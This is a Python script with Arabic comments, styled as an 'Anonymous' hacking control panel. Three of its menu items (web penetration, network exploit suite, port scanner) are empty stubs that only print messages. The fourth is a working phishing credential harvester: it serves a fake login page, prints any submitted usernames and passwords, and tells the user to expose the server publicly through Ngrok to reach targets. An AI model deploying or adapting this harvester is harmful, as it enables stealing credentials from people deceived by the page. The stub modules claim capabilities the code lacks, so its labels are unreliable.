import http.server
import os
import socketserver
import sys
import time


# دالة لتنظيف الشاشة وعرض بانر الأداة
def banner():
  os.system("clear")
  print(
      "=== ANONYMOUS MAIN CONTROL PANEL (ADVANCED) ==="
  )
  print("1. Web Application Penetration (Web Recon & Target Check)")
  print("2. Device & Network Exploit Suite (Real Active Listener)")
  print("3. System Diagnostic & Port Scanner")
  print("4. Advanced Phishing & Credential Harvester (Local Server)")
  print("5. Exit Framework")


# دالة تشغيل السيرفر الوهمي لجمع البيانات
def start_phishing_server():
  PORT = 8080
  os.system("clear")
  print(f"[*] Starting Phishing Server on http://localhost:{PORT}")
  print(
      "[*] Note: Use an external tunneling tool like Ngrok (ngrok http 8080)"
      " to get a public link."
  )
  print("[*] Waiting for target credentials... Press Ctrl+C to stop.\n")

  class PhishingHandler(http.server.SimpleHTTPRequestHandler):

    def do_POST(self):
      content_length = int(self.headers["Content-Length"])
      post_data = self.rfile.read(content_length)
      print(f"\n[+] Captured Data Received: {post_data.decode('utf-8')}")
      self.send_response(200)
      self.end_headers()
      self.wfile.write(b"Success")

    def do_GET(self):
      # عرض صفحة وهمية بسيطة للمستهدف (تقدر تعدل الـ HTML هنا براحتك)
      self.send_response(200)
      self.send_header("Content-type", "text/html")
      self.end_headers()
      html_content = """
            <html>
            <head><title>Login</title></head>
            <body style="font-family: Arial; text-align: center; margin-top: 50px;">
                <h2>Please Login to Continue</h2>
                <form method="POST">
                    <input type="text" name="username" placeholder="Username or Email" style="padding:10px; margin:5px; width:250px;"><br>
                    <input type="password" name="password" placeholder="Password" style="padding:10px; margin:5px; width:250px;"><br>
                    <button type="submit" style="padding:10px 20px; background:blue; color:white; border:none;">Login</button>
                </form>
            </body>
            </html>
            """
      self.wfile.write(html_content.encode("utf-8"))

  try:
    with socketserver.TCPServer(("", PORT), PhishingHandler) as httpd:
      httpd.serve_forever()
  except KeyboardInterrupt:
    print("\n[!] Phishing server stopped by user.")


# التشغيل الرئيسي للأداة
def main():
  while True:
    banner()
    choice = input("\nAnonymous@Root:~# ")

    if choice == "1":
      print(
          "\n[i] Running Web Application Penetration Module..."
      )
      time.sleep(2)
    elif choice == "2":
      print(
          "\n[i] Initializing Device & Network Exploit Suite..."
      )
      time.sleep(2)
    elif choice == "3":
      print("\n[i] Running System Diagnostic & Port Scanner...")
      time.sleep(2)
    elif choice == "4":
      start_phishing_server()
    elif choice == "5" or choice.lower() == "exit":
      print("\n[!] Cleaning up sessions... Exiting Anonymous Framework.")
      sys.exit(0)
    else:
      print("\n[!] Invalid command, try again.")
      time.sleep(1.5)


if __name__ == "__main__":
  main()

